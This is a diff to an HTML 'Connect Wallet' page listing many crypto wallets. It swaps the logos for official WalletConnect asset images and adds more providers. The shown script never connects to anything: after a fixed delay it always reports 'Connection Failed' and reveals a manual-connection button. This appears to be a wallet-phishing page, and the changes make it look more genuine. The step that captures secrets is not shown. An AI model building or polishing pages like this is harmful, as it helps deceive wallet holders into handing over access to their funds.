@@ -49,7 +49,7 @@
             padding: 10px;
         }
 
-        /* Scrollbar styling */
+        /* Scrollbar styling - Exactly like the sample */
         .wallet-grid::-webkit-scrollbar { width: 4px; }
         .wallet-grid::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
 
@@ -73,11 +73,11 @@
         }
 
         .wallet-icon {
-            width: 42px;
-            height: 42px;
-            object-fit: contain;
+            width: 44px;
+            height: 44px;
+            object-fit: cover;
             margin-bottom: 10px;
-            border-radius: 10px;
+            border-radius: 12px;
         }
 
         .wallet-name {
@@ -132,69 +132,84 @@
 
 <div class="container">
     <div class="card">
-        <img src="https://avatars.githubusercontent.com/u/37784886?s=200&v=4" class="logo-top" alt="Portal Logo">
+        <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/692ed74b-9f89-4085-802c-4638787c8000?projectId=c0563459e877fc5451676839a95728a3" class="logo-top" alt="Logo">
         <h1>Connect Wallet</h1>
-        <h6>Select a provider to continue to the portal</h6>
+        <h6>Please connect your wallet to continue</h6>
 
         <div class="wallet-grid">
             <div class="wallet-item" onclick="handleConnect('WalletConnect')">
-                <img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Logo/Blue%20(Default)/Logo.png" class="wallet-icon">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/75f3c0da-4458-4033-2895-46b0a688a200?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
                 <span class="wallet-name">WalletConnect</span>
             </div>
 
-            <div class="wallet-item" onclick="handleConnect('MetaMask')">
-                <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/Logomark/Metamask-衝刺-Logo.png" class="wallet-icon">
-                <span class="wallet-name">MetaMask</span>
-            </div>
-
             <div class="wallet-item" onclick="handleConnect('Trust Wallet')">
-                <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png" class="wallet-icon">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/0528ee7e-16d1-4089-21e3-b4a41d40a400?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
                 <span class="wallet-name">Trust</span>
             </div>
 
+            <div class="wallet-item" onclick="handleConnect('MetaMask')">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/c57ca71b-02f1-4fca-3f3c-04b12360f200?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
+                <span class="wallet-name">MetaMask</span>
+            </div>
+
             <div class="wallet-item" onclick="handleConnect('Phantom')">
-                <img src="https://raw.githubusercontent.com/phantom-labs/brand-assets/main/logos/icon/purple.png" class="wallet-icon">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/a7977d5b-3bc3-4d44-c751-9da034bc2000?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
                 <span class="wallet-name">Phantom</span>
             </div>
 
-            <div class="wallet-item" onclick="handleConnect('Exodus')">
-                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/exodus.png" class="wallet-icon">
-                <span class="wallet-name">Exodus</span>
-            </div>
-
             <div class="wallet-item" onclick="handleConnect('OKX')">
-                <img src="https://static.okx.com/cdn/assets/imgs/241/9735F3A519D0A7F5.png" class="wallet-icon">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/971e689d-f061-4ec4-11ef-935706247a00?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
                 <span class="wallet-name">OKX Wallet</span>
             </div>
 
             <div class="wallet-item" onclick="handleConnect('Rainbow')">
-                <img src="https://raw.githubusercontent.com/rainbow-me/rainbowkit/main/packages/rainbowkit/src/wallets/walletConnectors/rainbowWallet/rainbowWallet.png" class="wallet-icon">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/1bf33a34-84c1-435b-e19c-723de7404200?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
                 <span class="wallet-name">Rainbow</span>
             </div>
 
+            <div class="wallet-item" onclick="handleConnect('Exodus')">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/4c164a66-98e0-4951-bb31-bda04e744b00?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
+                <span class="wallet-name">Exodus</span>
+            </div>
+
             <div class="wallet-item" onclick="handleConnect('Coinbase')">
-                <img src="https://raw.githubusercontent.com/coinbase/coinbase-wallet-sdk/master/packages/wallet-sdk/assets/images/coinbase-wallet-logo.png" class="wallet-icon">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/fd20dc42-4a28-4ad9-a9b8-070d50f0af00?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
                 <span class="wallet-name">Coinbase</span>
             </div>
 
+            <div class="wallet-item" onclick="handleConnect('Binance')">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/8a0ee50d-434e-41c6-a61d-6df43c1d5600?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
+                <span class="wallet-name">Binance</span>
+            </div>
+
+            <div class="wallet-item" onclick="handleConnect('SafePal')">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/0b461abb-11ee-4227-a051-0a9ca23d4500?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
+                <span class="wallet-name">SafePal</span>
+            </div>
+
+            <div class="wallet-item" onclick="handleConnect('Zerion')">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/ecc4036f-bca9-41aa-eaf4-561d0fd11000?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
+                <span class="wallet-name">Zerion</span>
+            </div>
+
+            <div class="wallet-item" onclick="handleConnect('Uniswap')">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/713f9823-74ec-428a-1335-515437a34600?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
+                <span class="wallet-name">Uniswap</span>
+            </div>
+            
             <div class="wallet-item" onclick="handleConnect('Argent')">
-                <img src="https://raw.githubusercontent.com/argentlabs/argent-x/main/packages/extension/src/assets/logo.svg" class="wallet-icon">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/12c69460-a1c1-404b-f28a-7963e6398900?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
                 <span class="wallet-name">Argent</span>
             </div>
 
             <div class="wallet-item" onclick="handleConnect('Ledger')">
-                <img src="https://www.ledger.com/wp-content/uploads/2021/11/Ledger_favicon.png" class="wallet-icon">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/19177a98-2d2d-4876-b327-01d7ca2b4800?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
                 <span class="wallet-name">Ledger</span>
             </div>
 
-            <div class="wallet-item" onclick="handleConnect('Uniswap')">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Uniswap_Logo.svg" class="wallet-icon">
-                <span class="wallet-name">Uniswap</span>
-            </div>
-
-            <div class="wallet-item" onclick="handleConnect('Binance')">
-                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png" class="wallet-icon">
-                <span class="wallet-name">Binance</span>
+            <div class="wallet-item" onclick="handleConnect('Bitget')">
+                <img src="https://explorer-api.walletconnect.com/w3m/v1/getAssetImage/33f97230-711f-447c-057d-77344836e000?projectId=c0563459e877fc5451676839a95728a3" class="wallet-icon">
+                <span class="wallet-name">Bitget</span>
             </div>
         </div>
     </div>
@@ -216,10 +231,10 @@
 
         setTimeout(() => {
             spinner.style.display = 'none';
-            title.innerText = "Error Connecting";
+            title.innerText = "Connection Failed";
             error.style.display = 'block';
             manualBtn.style.display = 'block';
-        }, 3500);
+        }, 3000);
     }
 </script>
 
